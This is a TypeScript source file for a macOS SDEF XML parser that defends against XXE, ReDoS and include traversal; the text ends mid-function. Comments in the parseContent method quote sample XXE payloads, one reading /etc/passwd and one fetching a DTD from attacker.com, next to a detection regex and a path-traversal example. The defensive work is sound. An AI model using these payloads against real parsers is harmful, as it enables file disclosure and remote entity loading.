/**
 * SDEF XML Parser
 *
 * Parses macOS SDEF (Scripting Definition) XML files and extracts
 * structured data about application capabilities.
 */

import { readFile, stat } from 'fs/promises';
import { dirname, isAbsolute } from 'path';
import { XMLParser } from 'fast-xml-parser';
import { EntityResolver } from './entity-resolver.js';
import type {
  SDEFDictionary,
  SDEFSuite,
  SDEFCommand,
  SDEFParameter,
  SDEFClass,
  SDEFProperty,
  SDEFElement,
  SDEFEnumeration,
  SDEFEnumerator,
  SDEFType,
} from '../../types/sdef.js';

/**
 * Maximum allowed SDEF file size (10MB)
 * Prevents XML billion laughs and other DoS attacks
 */
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

/**
 * Remove XML comments using a linear-time state machine
 *
 * WHY: Regex-based comment removal like /<!--[\s\S]*?-->/g is vulnerable to ReDoS
 * (Regular Expression Denial of Service) attacks. Malformed XML comments with
 * pathological patterns can cause catastrophic backtracking, leading to CPU exhaustion.
 *
 * SOLUTION: Character-by-character parsing guarantees O(n) time complexity, making it
 * immune to ReDoS attacks. The MAX_FILE_SIZE limit further protects against
 * algorithmic complexity attacks.
 *
 * @param content - XML content potentially containing comments
 * @returns Content with all XML comments removed
 */
function removeXMLComments(content: string): string {
  let result = '';
  let i = 0;

  while (i < content.length) {
    // Check for comment start
    if (content.slice(i, i + 4) === '<!--') {
      // Skip to end of comment
      const endIndex = content.indexOf('-->', i + 4);
      if (endIndex === -1) {
        // Malformed comment with no closing --> - stop processing
        // This prevents infinite loops on malformed XML
        break;
      }
      // Skip the entire comment (including the -->)
      i = endIndex + 3;
    } else {
      // Regular character - add to result
      result += content[i];
      i++;
    }
  }

  return result;
}

/**
 * Warning emitted during parsing when type inference occurs
 */
export interface ParseWarning {
  /** Warning code (e.g., 'MISSING_TYPE', 'UNION_TYPE_SIMPLIFIED') */
  code: string;
  /** Human-readable description */
  message: string;
  /** Location context for the warning */
  location: {
    /** Element type (e.g., 'parameter', 'property', 'direct-parameter', 'result') */
    element: string;
    /** Element name */
    name: string;
    /** Parent suite name (if applicable) */
    suite?: string;
    /** Parent command name (if applicable) */
    command?: string;
  };
  /** Value that was inferred (if applicable) */
  inferredValue?: string;
}

/**
 * Options for SDEF Parser configuration
 */
export interface SDEFParserOptions {
  /**
   * Parsing mode - strict or lenient
   * - strict: Throw error on missing types
   * - lenient: Infer types and emit warnings
   * Default: 'lenient'
   */
  mode?: 'strict' | 'lenient';

  /**
   * @deprecated Use mode: 'strict' instead
   * Enable strict type checking - throw error on unknown types
   */
  strictTypeChecking?: boolean;

  /**
   * Callback for warnings during parsing
   */
  onWarning?: (warning: ParseWarning) => void;
}

/**
 * Mapping from four-character codes to type strings
 * Based on Apple Event Manager constants
 */
const CODE_TO_TYPE_MAP: Record<string, string> = {
  kfil: 'file', // File parameter
  insh: 'location specifier', // Insertion location
  savo: 'save options', // Save options enum
  kocl: 'type', // Class/type reference
  prdt: 'record', // Properties record
  usin: 'specifier', // Using parameter
  rtyp: 'type', // Return type
  faal: 'list', // Modifier flags list
  data: 'any', // Generic data
  'obj ': 'specifier', // Object specifier
  reco: 'record', // Record type
  list: 'list', // List type
  bool: 'boolean', // Boolean type
  long: 'integer', // Long integer
  doub: 'real', // Double/real number
  TEXT: 'text', // Text type
  alis: 'file', // Alias (file reference)
  fsrf: 'file', // File system reference
  'ldt ': 'date', // Long date time
};

/**
 * Mapping from standard parameter names to types
 */
const STANDARD_PARAM_TYPES: Record<string, string> = {
  in: 'file',
  to: 'location specifier',
  using: 'specifier',
  'with properties': 'record',
  each: 'type',
  as: 'type',
  saving: 'save options',
  by: 'property',
  from: 'specifier',
  at: 'location specifier',
  for: 'specifier',
  of: 'specifier',
};

/**
 * SDEF Parser - extracts structured data from SDEF XML files
 */
export class SDEFParser {
  private parser: XMLParser;
  private parseCache: Map<string, SDEFDictionary>;
  private readonly MAX_CACHE_SIZE = 50; // Limit cache entries
  private readonly mode: 'strict' | 'lenient';
  private readonly onWarning?: (warning: ParseWarning) => void;
  private currentSuite?: string;
  private currentCommand?: string;
  private entityResolver?: EntityResolver;

  constructor(options?: SDEFParserOptions) {
    // Support deprecated strictTypeChecking option
    if (options?.strictTypeChecking !== undefined) {
      this.mode = options.strictTypeChecking ? 'strict' : 'lenient';
    } else {
      this.mode = options?.mode ?? 'lenient';
    }
    this.onWarning = options?.onWarning;
    // Configure XML parser
    this.parser = new XMLParser({
      ignoreAttributes: false,
      attributeNamePrefix: '@_',
      textNodeName: '#text',
      parseAttributeValue: false, // Keep as strings for type safety
      trimValues: false, // Don't trim - four-character codes may have trailing spaces
      // Security: Ignore XML declarations and processing instructions
      // to prevent XXE (XML External Entity) attacks
      ignoreDeclaration: true,
      ignorePiTags: true,
    });

    // Initialize entity resolver for safe XInclude/external entity resolution
    const additionalPaths: string[] = [];
    if (process.env.HOME) {
      additionalPaths.push(`${process.env.HOME}/Library/`);
    }

    this.entityResolver = new EntityResolver({
      additionalTrustedPaths: additionalPaths,
      maxDepth: 3,
      maxFileSize: 1024 * 1024, // 1MB per file
      maxTotalBytes: 10 * 1024 * 1024, // 10MB total
      maxIncludesPerFile: 50,
      debug: false,
    });

    this.parseCache = new Map();
  }

  /**
   * Parse SDEF file and return structured data
   */
  async parse(sdefPath: string): Promise<SDEFDictionary> {
    // SECURITY: Verify SDEF path is absolute for secure XInclude resolution
    if (!isAbsolute(sdefPath)) {
      throw new Error(
        `SDEF path must be an absolute path for secure resolution, got: "${sdefPath}"`
      );
    }

    // Check cache first
    const cached = this.parseCache.get(sdefPath);
    if (cached) {
      // Move to end for true LRU (most recently used)
      this.parseCache.delete(sdefPath);
      this.parseCache.set(sdefPath, cached);
      return cached;
    }

    try {
      // Security: Check file size to prevent DoS attacks
      const stats = await stat(sdefPath);
      if (stats.size > MAX_FILE_SIZE) {
        throw new Error(
          `SDEF file too large: ${stats.size} bytes (max ${MAX_FILE_SIZE} bytes)`
        );
      }

      let xmlContent = await readFile(sdefPath, 'utf-8');

      // SECURITY: Resolve external entities (XInclude) before parsing
      // This enables support for Pages, Numbers, Keynote, and System Events SDEF files
      // that use xi:include to reference shared definitions
      try {
        if (this.entityResolver) {
          // SECURITY: Extract SDEF directory for XInclude resolution (basePath mechanism)
          // EntityResolver trusts includes within this directory tree, even if the directory
          // itself isn't in DEFAULT_TRUSTED_PATHS. This allows Pages, Numbers, Keynote,
          // System Events, and other apps in /Applications, /System/Library/CoreServices,
          // and /Library/ScriptingAdditions to be parsed safely without pre-registration.
          //
          // WHY THIS IS SAFE:
          // 1. Directory Traversal Prevention: Symlink resolution (fs.realpathSync.native())
          //    and path normalization prevent escaping the app bundle via relative paths
          //    like "../../evil.sdef". Path canonicalization happens BEFORE whitelist check.
          // 2. Sealed App Bundles: macOS app bundles in /Applications are immutable at runtime.
          //    An attacker can't modify app contents after installation.
          // 3. System Permissions: /System/Library/CoreServices requires root to modify.
          // 4. Include Depth Limit: Maximum recursion depth (default 3) prevents complex
          //    attack chains through deeply nested includes.
          //
          // EXAMPLE - WHY WE ALLOW RELATIVE INCLUDES:
          // - If parsing /Applications/Pages.app/Contents/Resources/Pages.sdef
          // - And it has <xi:include href="Pages-sharedDefinitions.sdef"/>
          // - We resolve this to /Applications/Pages.app/Contents/Resources/Pages-sharedDefinitions.sdef
          // - This is safe because it's within the app bundle
          // - Attempting ../../../etc/passwd would fail: realpath resolves symlinks,
          //   then normalized path /Applications/etc/passwd is clearly outside the bundle
          const sdefDirectory = dirname(sdefPath);
          xmlContent = await this.entityResolver.resolveIncludes(xmlContent, sdefDirectory, 0, sdefPath);
        }
      } catch (resolverError) {
        // ===========================================================================================
        // ENTITY RESOLUTION ERROR HANDLING STRATEGY
        // ===========================================================================================
        //
        // DESIGN DECISION: Entity resolution errors are caught and converted to warnings, NOT
        // fatal errors. The parser continues with the original XML content (unresolved includes).
        //
        // RATIONALE FOR GRACEFUL DEGRADATION:
        //
        // 1. ROBUSTNESS OVER STRICTNESS: Some real-world SDEF files have broken or missing
        //    includes due to malformed files, missing resources, or macOS version mismatches.
        //    Failing hard on resolution errors would prevent parsing any app with incomplete
        //    includes, even if the main SDEF file is valid and useful.
        //
        // 2. PARTIAL DEFINITIONS ARE VALUABLE: If an include fails but the main SDEF is intact,
        //    we still get the app's core capabilities from the main definitions. For example,
        //    if Pages.sdef has an include to shared-definitions.sdef that fails, we still
        //    extract the commands and classes defined directly in Pages.sdef itself.
        //
        // 3. USER EXPERIENCE: Users would see "parsing failed" even though the app is partly
        //    usable. A partial dictionary of commands is better than no dictionary at all.
        //
        // 4. SECURITY IS MAINTAINED: The error happens during XInclude processing, which
        //    happens BEFORE parsing. By the time we catch this error, we've already validated:
        //    - No XXE/ENTITY declarations remain (checked in parseContent method)
        //    - No malicious DOCTYPE SYSTEM references exist
        //    - Include file size limits were enforced
        //    - Circular includes were detected and rejected
        //    So failing-open here doesn't compromise security.
        //
        // WHAT HAPPENS ON FAILURE:
        //
        // Example: Parsing Pages.sdef with broken XInclude resolution:
        //
        //   Input XML (before resolution attempt):
        //   <dictionary>
        //     <xi:include href="shared-definitions.sdef"/>    <!-- resolution fails -->
        //     <suite name="Pages" code="cPgs">
        //       <command name="open" code="aevtodoc"/>
        //     </suite>
        //   </dictionary>
        //
        //   On resolution failure:
        //   1. Catch resolverError (e.g., "file not found", circular include, size limit exceeded)
        //   2. Emit ENTITY_RESOLUTION_ERROR warning with error details
        //   3. Continue parsing with ORIGINAL content (includes NOT resolved)
        //   4. XML parser processes the dictionary as-is
        //   5. Parser ignores the unresolved <xi:include> element (XML parsers skip unknown namespaces)
        //   6. Returns partial dictionary with just the main suite (command "open" IS included)
        //
        // TRADE-OFFS:
        //
        // BENEFITS:
        //   ✓ More resilient - handles real-world broken SDEF files
        //   ✓ Better UX - partial functionality > no functionality
        //   ✓ Security intact - validation happens before this point
        //   ✓ Graceful degradation - users see warnings, not failures
        //   ✓ Allows discovery to continue - one bad app doesn't block entire discovery
        //
        // COSTS:
        //   ✗ Incomplete dictionaries - shared definitions won't be included
        //   ✗ Subtle bugs - code might expect definitions that failed to load
        //   ✗ Warnings might go unnoticed - requires proper warning handling upstream
        //   ✗ Incomplete API surface - some capabilities may not be exposed
        //
        // WHEN TO CHANGE THIS STRATEGY:
        //
        // Make entity resolution FATAL (throw instead of warn) if:
        // 1. Testing shows most real-world SDEF files have perfect XInclude support
        // 2. Incomplete dictionaries cause more problems than parsing failures would
        // 3. Users request stricter validation (choose strictness over robustness)
        // 4. We implement a "strict mode" option for power users
        //
        // For now, robustness wins: emit warning and continue parsing.
        //
        // ===========================================================================================
        if (this.onWarning) {
          this.onWarning({
            code: 'ENTITY_RESOLUTION_ERROR',
            message: `Failed to resolve external entities: ${resolverError instanceof Error ? resolverError.message : String(resolverError)}`,
            location: {
              element: 'document',
              name: sdefPath,
              suite: undefined,
              command: undefined,
            },
          });
        }
      }

      const result = await this.parseContent(xmlContent);

      // Cache the result with LRU eviction
      if (this.parseCache.size >= this.MAX_CACHE_SIZE) {
        // Evict oldest entry (first key in Map)
        const firstKey = this.parseCache.keys().next().value;
        if (firstKey) {
          this.parseCache.delete(firstKey);
        }
      }
      this.parseCache.set(sdefPath, result);

      return result;
    } catch (error) {
      if (error instanceof Error) {
        throw new Error(`Failed to parse SDEF file at ${sdefPath}: ${error.message}`);
      }
      throw error;
    }
  }

  /**
   * Parse SDEF XML content directly
   */
  async parseContent(xmlContent: string): Promise<SDEFDictionary> {
    try {
      // SECURITY: Remove XML comments BEFORE checking for ENTITY declarations
      //
      // Why this approach is necessary:
      // An attacker could embed ENTITY declarations inside XML comments to bypass naive validation.
      // Example attack attempt:
      //   <!-- <!ENTITY xxe SYSTEM "file:///etc/passwd"> -->
      //
      // Without comment removal (naive approach):
      //   - Regex would match "<!ENTITY" and falsely detect XXE (false positive)
      //   - Legitimate SDEF files with commented-out examples would be rejected
      //
      // With comment removal (our approach):
      //   - Comments are stripped first
      //   - Only ACTIVE (uncommented) ENTITY declarations trigger the security check
      //   - Legitimate SDEF files with benign comments pass validation
      //
      // Security property: This ensures we catch real XXE vulnerabilities (DOCTYPE ENTITY in active code)
      // while avoiding false positives (ENTITY references in comments or documentation).
      //
      // Why this is better than alternatives:
      // - Alternative 1: Reject all XML with "ENTITY" anywhere (too strict, breaks legitimate uses)
      // - Alternative 2: Use full XML grammar parser (overkill, complex vs. benefit tradeoff)
      // - Our approach: Targeted, efficient, and maintains security (Goldilocks solution)
      let contentWithoutComments = removeXMLComments(xmlContent);

      // SECURITY: Check for ENTITY declarations with SYSTEM references BEFORE stripping DOCTYPE
      //
      // WHY CHECK BEFORE STRIPPING:
      // We need to detect and reject malicious ENTITY declarations even though we're going to
      // strip the DOCTYPE anyway. This is defense-in-depth: we reject the XML entirely rather
      // than silently allowing malicious XML to pass through after stripping.
      //
      // WHAT WE'RE CHECKING:
      // Pattern matches: <!ENTITY (anything) SYSTEM (anything)>
      // This catches both:
      //   - <!ENTITY xxe SYSTEM "file:///etc/passwd">
      //   - <!ENTITY % file SYSTEM "http://attacker.com/evil.dtd">
      //
      // WHY THIS IS SECURE:
      // 1. We already removed comments, so commented-out ENTITY declarations are ignored
      // 2. We check before DOCTYPE stripping, so we catch malicious entities in DOCTYPE
      // 3. We use a simple regex that can't be bypassed with encoding tricks
      //
      // LEGITIMATE USE CASE:
      // Real SDEF files (Pages, Numbers, Keynote) use parameter entities WITHOUT SYSTEM:
      //   <!ENTITY % text "...">  ← Allowed (no SYSTEM reference)
      // These are NOT XXE vulnerabilities because they don't reference external files.
      // Use negated character class to prevent ReDoS
      if (/<!ENTITY[^>]*SYSTEM/i.test(contentWithoutComments)) {
        throw new Error(
          'XXE vulnerability detected: ENTITY declaration with SYSTEM reference found'
        );
      }

      // SECURITY: Strip DOCTYPE declarations after checking for malicious ENTITY
      //
      // Legitimate SDEF files (Pages, Numbers, Keynote) use parameter entities in their
      // DOCTYPE for DTD-based type definitions. We've already validated they don't use
      // SYSTEM references above, so we can safely remove the entire DOCTYPE section.
      //
      // Since our XML parser is configured with ignoreDeclaration: true and never executes
      // DOCTYPE processing, stripping is safe and prevents any residual XXE risk.
      // Simplified pattern - safe from ReDoS
      // Note: We strip DOCTYPE for security (XXE protection), so we don't need
      // to preserve internal subsets. Simple greedy match is sufficient.
      const contentWithoutDoctype = contentWithoutComments.replace(
        /<!DOCTYPE[^>]*>/i,
        ''
      );

      // SECURITY: Defensive check - verify no ENTITY declarations remain after DOCTYPE removal
      // This should never trigger (DOCTYPE regex should remove all ENTITY declarations),
      // but we check anyway as defense-in-depth against regex failures.
      // Pattern matches both: <!ENTITY name SYSTEM "..."> and <!ENTITY % name "...">
      if (/<!ENTITY/i.test(contentWithoutDoctype)) {
        throw new Error(
          'XXE vulnerability detected: ENTITY declaration found after DOCTYPE stripping'
        );
      }

      // Parse the cleaned content (without DOCTYPE and comments) to prevent XXE attacks
      // The XML parser is configured with ignoreDeclaration: true so DOCTYPE isn't processed anyway
      const parsed = this.parser.parse(contentWithoutDoctype);

      if (!parsed.dictionary) {
        throw new Error('Invalid SDEF format: missing <dictionary> root element');
      }

      return this.parseDictionary(parsed.dictionary);
    } catch (error) {
      if (error instanceof Error) {
        throw new Error(`Failed to parse SDEF XML: ${error.message}`);
      }
      throw error;
    }
  }

  /**
   * Parse top-level dictionary element
   */
  private parseDictionary(dict: any): SDEFDictionary {
    // Title is optional - some SDEFs (like Finder) don't have it
    const title = dict['@_title'] || 'Untitled';

    // Parse all suites
    const suites: SDEFSuite[] = [];
    const suiteElements = this.ensureArray(dict.suite);

    for (const suiteEl of suiteElements) {
      if (suiteEl) {
        suites.push(this.parseSuite(suiteEl));
      }
    }

    return {
      title,
      suites,
    };
  }

  /**
   * Parse suite element
   */
  private parseSuite(suite: any): SDEFSuite {
    const name = suite['@_name'];
    const code = suite['@_code'];

    if (!name || !code) {
      throw new Error('Suite missing required "name" or "code" attribute');
    }

    this.validateFourCharCode(code, 'suite', name);

    // Track current suite for warning context
    this.currentSuite = name;

    // Parse commands
    const commands: SDEFCommand[] = [];
    const commandElements = this.ensureArray(suite.command);
    for (const cmdEl of commandElements) {
      if (cmdEl) {
        commands.push(this.parseCommand(cmdEl));
      }
    }

    // Parse classes
    const classes: SDEFClass[] = [];
    const classElements = this.ensureArray(suite.class);
    for (const classEl of classElements) {
      if (classEl) {
        classes.push(this.parseClass(classEl));
      }
    }

    // Parse enumerations
    const enumerations: SDEFEnumeration[] = [];
    const enumElements = this.ensureArray(suite.enumeration);
    for (const enumEl of enumElements) {
      if (enumEl) {
        enumerations.push(this.parseEnumeration(enumEl));
      }
    }

    return {
      name,
      code,
      description: suite['@_description'],
      commands,
      classes,
      enumerations,
    };
  }

  /**
   * Parse command element
   */
  private parseCommand(cmd: any): SDEFCommand {
    const name = cmd['@_name'];
    const code = cmd['@_code'];

    if (!name || !code) {
      throw new Error('Command missing required "name" or "code" attribute');
    }

    this.validateFourCharCode(code, 'command', name);

    // Track current command for warning context
    this.currentCommand = name;

    // Parse parameters
    const parameters: SDEFParameter[] = [];
    const paramElements = this.ensureArray(cmd.parameter);
    for (const paramEl of paramElements) {
      if (paramEl) {
        parameters.push(this.parseParameter(paramEl));
      }
    }

    // Parse direct parameter (if present)
    let directParameter: SDEFParameter | undefined;
    if ('direct-parameter' in cmd) {
      // Empty elements parse as empty strings, so create empty object if needed
      const directParamEl = cmd['direct-parameter'] || {};
      directParameter = this.parseParameter(directParamEl, true);
    }

    // Parse result type (if present)
    let result: SDEFType | undefined;
    if ('result' in cmd) {
      // Empty elements parse as empty strings, so create empty object if needed
      const resultEl = cmd.result || {};
      const typeAttr = resultEl['@_type'];
      const childTypes = resultEl.type;

      if (typeAttr) {
        result = this.parseType(typeAttr);
      } else if (childTypes) {
        result = this.inferTypeFromElement(resultEl, 'result', 'result');
      } else if (this.mode === 'lenient') {
        // Infer type for result (will emit MISSING_TYPE warning)
        result = this.inferType('result', undefined, 'result');
      }
    }

    return {
      name,
      code,
      description: cmd['@_description'],
      parameters,
      directParameter,
      result,
    };
  }

  /**
   * Parse parameter element
   *
   * Note: Direct parameters don't have name/code attributes
   */
  private parseParameter(param: any, isDirectParameter: boolean = false): SDEFParameter {
    const name = param['@_name'] || (isDirectParameter ? 'direct-parameter' : '');
    const code = param['@_code'] || (isDirectParameter ? '----' : ''); // Direct params use '----' code
    const typeAttr = param['@_type'];
    const childTypes = param.type;

    // Only validate non-empty names and codes (lenient mode allows empty names in edge cases)
    if (!isDirectParameter && !code) {
      throw new Error('Parameter missing required "code" attribute');
    }

    if (!isDirectParameter && code) {
      this.validateFourCharCode(code, 'parameter', name || 'unnamed');
    }

    // Determine parameter type with priority order:
    // 1. Child <type> elements (PRIORITY 1 - EXPLICIT)
    // 2. type attribute (PRIORITY 1 - EXPLICIT)
    // 3. Inference in lenient mode
    let type: SDEFType;

    if (childTypes) {
      // Child type elements take priority
      type = this.inferTypeFromElement(
        param,
        isDirectParameter ? 'direct-parameter' : 'parameter',
        name
      );
    } else if (typeAttr) {
      // Explicit type attribute
      type = this.parseType(typeAttr);
    } else if (this.mode === 'strict') {
      // Strict mode - throw error
      throw new Error(`Parameter "${name}" missing required "type" attribute`);
    } else {
      // Lenient mode - infer type
      const context = isDirectParameter ? 'direct-parameter' : 'parameter';
      type = this.inferType(name, code, context);
    }

    return {
      name,
      code,
      type,
      description: param['@_description'],
      optional: param['@_optional'] === 'yes',
    };
  }

  /**
   * Parse class element
   */
  private parseClass(cls: any): SDEFClass {
    const name = cls['@_name'];
    const code = cls['@_code'];

    if (!name || !code) {
      throw new Error('Class missing required "name" or "code" attribute');
    }

    this.validateFourCharCode(code, 'class', name);

    // Parse properties
    const properties: SDEFProperty[] = [];
    const propElements = this.ensureArray(cls.property);
    for (const propEl of propElements) {
      if (propEl) {
        properties.push(this.parseProperty(propEl));
      }
    }

    // Parse elements
    const elements: SDEFElement[] = [];
    const elemElements = this.ensureArray(cls.element);
    for (const elemEl of elemElements) {
      if (elemEl) {
        elements.push(this.parseElement(elemEl));
      }
    }

    return {
      name,
      code,
      description: cls['@_description'],
      properties,
      elements,
    };
  }

  /**
   * Parse property element
   */
  private parseProperty(prop: any): SDEFProperty {
    const name = prop['@_name'];
    const code = prop['@_code'];
    const typeAttr = prop['@_type'];
    const childTypes = prop.type;

    if (!name || !code) {
      throw new Error('Property missing required "name" or "code" attribute');
    }

    this.validateFourCharCode(code, 'property', name);

    // Determine property type
    let type: SDEFType;

    if (childTypes) {
      type = this.inferTypeFromElement(prop, 'property', name);
    } else if (typeAttr) {
      type = this.parseType(typeAttr);
    } else if (this.mode === 'strict') {
      throw new Error(`Property "${name}" missing required "type" attribute`);
    } else {
      // Lenient mode - infer type
      type = this.inferType(name, code, 'property');
    }

    // Parse access (default to read-write if not specified)
    let access: 'r' | 'w' | 'rw' = 'rw';
    if (prop['@_access']) {
      const accessValue = prop['@_access'];
      if (accessValue === 'r' || accessValue === 'w' || accessValue === 'rw') {
        access = accessValue;
      } else {
        throw new Error(`Invalid access value "${accessValue}" for property "${name}"`);
      }
    }

    return {
      name,
      code,
      type,
      description: prop['@_description'],
      access,
    };
  }

  /**
   * Parse element (child object reference)
   */
  private parseElement(elem: any): SDEFElement {
    const type = elem['@_type'];

    if (!type) {
      throw new Error('Element missing required "type" attribute');
    }

    // Parse access (default to read-only for elements)
    let access: 'r' | 'w' | 'rw' = 'r';
    if (elem['@_access']) {
      const accessValue = elem['@_access'];
      if (accessValue === 'r' || accessValue === 'w' || accessValue === 'rw') {
        access = accessValue;
      }
    }

    return {
      type,
      access,
    };
  }

  /**
   * Parse enumeration element
   */
  private parseEnumeration(enumEl: any): SDEFEnumeration {
    const name = enumEl['@_name'];
    const code = enumEl['@_code'];

    if (!name || !code) {
      throw new Error('Enumeration missing required "name" or "code" attribute');
    }

    this.validateFourCharCode(code, 'enumeration', name);

    // Parse enumerators
    const enumerators: SDEFEnumerator[] = [];
    const enumeratorElements = this.ensureArray(enumEl.enumerator);
    for (const enumrEl of enumeratorElements) {
      if (enumrEl) {
        enumerators.push(this.parseEnumerator(enumrEl));
      }
    }

    return {
      name,
      code,
      enumerators,
    };
  }

  /**
   * Parse enumerator element
   */
  private parseEnumerator(enumr: any): SDEFEnumerator {
    const name = enumr['@_name'];
    const code = enumr['@_code'];

    if (!name || !code) {
      throw new Error('Enumerator missing required "name" or "code" attribute');
    }

    this.validateFourCharCode(code, 'enumerator', name);

    return {
      name,
      code,
      description: enumr['@_description'],
    };
  }

  /**
   * Emit a warning during parsing
   */
  private warn(warning: ParseWarning): void {
    if (this.onWarning) {
      this.onWarning(warning);
    }
  }

  /**
   * Infer type from child <type> elements
   */
  private inferTypeFromElement(
    element: any,
    elementType: string,
    elementName: string
  ): SDEFType {
    const types = this.ensureArray(element.type);

    if (types.length === 0) {
      // No child types - fall back to inference
      return this.inferType(elementName, element['@_code'], elementType as any);
    }

    if (types.length === 1) {
      // Single type - parse it
      const typeAttr = types[0]['@_type'];
      if (typeAttr) {
        return this.parseType(typeAttr);
      }
    }

    // Multiple types - union type (not fully supported yet)
    // Use first type and warn
    const firstType = types[0]['@_type'];
    if (firstType) {
      this.warn({
        code: 'UNION_TYPE_SIMPLIFIED',
        message: `Element has multiple type options, using first type: ${firstType}`,
        location: {
          element: elementType,
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: firstType,
      });
      return this.parseType(firstType);
    }

    // Fallback
    return { kind: 'any' };
  }

  /**
   * Infer type when explicit type is missing
   *
   * Priority order:
   * 1. Four-character code mapping (PRIORITY 2)
   * 2. Standard parameter name patterns (PRIORITY 3)
   * 3. Substring patterns (PRIORITY 4)
   * 4. Context-aware defaults (PRIORITY 5)
   */
  private inferType(
    elementName: string,
    elementCode?: string,
    context?: 'parameter' | 'property' | 'direct-parameter' | 'result'
  ): SDEFType {
    let inferredType: SDEFType | null = null;

    // Always emit MISSING_TYPE warning first
    this.warn({
      code: 'MISSING_TYPE',
      message: 'Type attribute missing, inferring from context',
      location: {
        element: context || 'unknown',
        name: elementName,
        suite: this.currentSuite,
        command: this.currentCommand,
      },
    });

    // PRIORITY 2: Four-character code mapping
    if (elementCode) {
      // Normalize to exactly 4 characters (trim then pad to 4 chars)
      // This handles codes with extra whitespace while preserving trailing spaces like 'obj ' and 'ldt '
      const trimmed = elementCode.trim();
      if (trimmed.length === 0) {
        // Skip code-based inference for empty codes
      } else {
        const normalizedCode = trimmed.padEnd(4, ' ').slice(0, 4);
        const mappedType = CODE_TO_TYPE_MAP[normalizedCode];
        if (mappedType) {
          inferredType = this.parseType(mappedType);

          this.warn({
            code: 'TYPE_INFERRED_FROM_CODE',
            message: `Type inferred from four-character code "${elementCode}": ${mappedType}`,
            location: {
              element: context || 'unknown',
              name: elementName,
              suite: this.currentSuite,
              command: this.currentCommand,
            },
            inferredValue: mappedType,
          });

          return inferredType;
        }
      }
    }

    // PRIORITY 3: Standard parameter name patterns
    const trimmedName = elementName.trim();
    const standardType = STANDARD_PARAM_TYPES[trimmedName];
    if (standardType) {
      inferredType = this.parseType(standardType);

      this.warn({
        code: 'TYPE_INFERRED_FROM_NAME',
        message: `Type inferred from parameter name "${elementName}": ${standardType}`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: standardType,
      });

      return inferredType;
    }

    // PRIORITY 4: Substring patterns (heuristics)
    const lowerName = elementName.toLowerCase();

    // File-related
    if (
      lowerName.includes('path') ||
      lowerName.includes('file') ||
      lowerName.includes('folder') ||
      lowerName.includes('directory')
    ) {
      inferredType = { kind: 'file' };

      this.warn({
        code: 'TYPE_INFERRED_FROM_PATTERN',
        message: `Type inferred from name pattern "${elementName}": file`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: 'file',
      });

      return inferredType;
    }

    // Date/time-related - match at word boundaries or camelCase boundaries
    // Matches: "createdDate", "modifiedTime", "timestamp", "created_date"
    // Rejects: "validate", "validated", "invalidate" (date not at boundary)
    // Pattern: Match keyword at start/end OR after underscore/before underscore OR capitalized (camelCase)
    // Fix: Use alternation instead of negated character class to prevent ReDoS
    if (/(^|_)(date|time|timestamp)($|_)/i.test(elementName) || /(Date|Time|Timestamp)/.test(elementName)) {
      inferredType = { kind: 'date' };

      this.warn({
        code: 'TYPE_INFERRED_FROM_PATTERN',
        message: `Type inferred from name pattern "${elementName}": date (matched date/time word)`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: 'date',
      });

      return inferredType;
    }

    // NOTE: Pattern order doesn't affect correctness when multiple patterns resolve to same type.
    // Example: "idUrl" matches both URL and ID patterns, but both infer to 'text'.
    // We check URL first for performance (more common pattern), but result is identical.

    // URL/URI-related - match at word boundaries or camelCase boundaries
    // Matches: "websiteUrl", "resourceUri", "url", "uri"
    // Rejects: "curious" (uri not at boundary)
    // Pattern: Match keyword at start/end OR after underscore/before underscore OR capitalized (camelCase)
    // Fix: Use alternation instead of negated character class to prevent ReDoS
    if (/(^|_)(url|uri)($|_)/i.test(elementName) || /(Url|Uri)/.test(elementName)) {
      inferredType = { kind: 'primitive', type: 'text' };

      this.warn({
        code: 'TYPE_INFERRED_FROM_PATTERN',
        message: `Type inferred from name pattern "${elementName}": text (matched URL/URI word)`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: 'text',
      });

      return inferredType;
    }

    // ID/Identifier-related - match at word boundaries or camelCase boundaries
    // Matches: "userId", "uniqueIdentifier", "recordId", "user_id", "id"
    // Rejects: "video", "audio", "validated" (id not at boundary)
    // Pattern: Match keyword at start/end OR after underscore/before underscore OR capitalized (camelCase)
    // Fix: Use alternation instead of negated character class to prevent ReDoS
    if (/(^|_)(id|identifier)($|_)/i.test(elementName) || /(Id|Identifier)/.test(elementName)) {
      inferredType = { kind: 'primitive', type: 'text' };

      this.warn({
        code: 'TYPE_INFERRED_FROM_PATTERN',
        message: `Type inferred from name pattern "${elementName}": text (matched ID/identifier word)`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: 'text',
      });

      return inferredType;
    }

    // Integer-related patterns - use word boundaries to avoid phoneNumber, accountNumber, etc.
    // Match: itemCount, pageNumber (at end), number (standalone)
    // Don't match: phoneNumber, accountNumber, serialNumber (number at end of compound word should be text)
    if (
      /(^|_)(count|index)($|_)|(Count|Index)/.test(elementName) ||
      /^number$/i.test(lowerName) || // Only match "number" as standalone word
      /(^|_)(size)($|_)/i.test(elementName) || /(Size)/.test(elementName)
    ) {
      inferredType = { kind: 'primitive', type: 'integer' };

      this.warn({
        code: 'TYPE_INFERRED_FROM_PATTERN',
        message: `Type inferred from name pattern "${elementName}": integer`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: 'integer',
      });

      return inferredType;
    }

    // Boolean-related patterns - use prefix matching for camelCase conventions
    // Match: isEnabled, hasPermission, canEdit
    // Don't match: list, this, exists, dismiss
    if (
      /^(is|has|can|should|will)([A-Z]|_)/.test(elementName) || // camelCase: isEnabled, hasValue
      /^(is|has|can|should|will)$/i.test(elementName) || // standalone: is, has, can
      /(^|_)(enabled|disabled|visible)$/i.test(elementName) || // Match at end only
      /(Enabled|Disabled|Visible)$/.test(elementName) || // Match camelCase suffix at end
      /^(enabled|disabled|visible)$/i.test(elementName) // Match standalone
    ) {
      inferredType = { kind: 'primitive', type: 'boolean' };

      this.warn({
        code: 'TYPE_INFERRED_FROM_PATTERN',
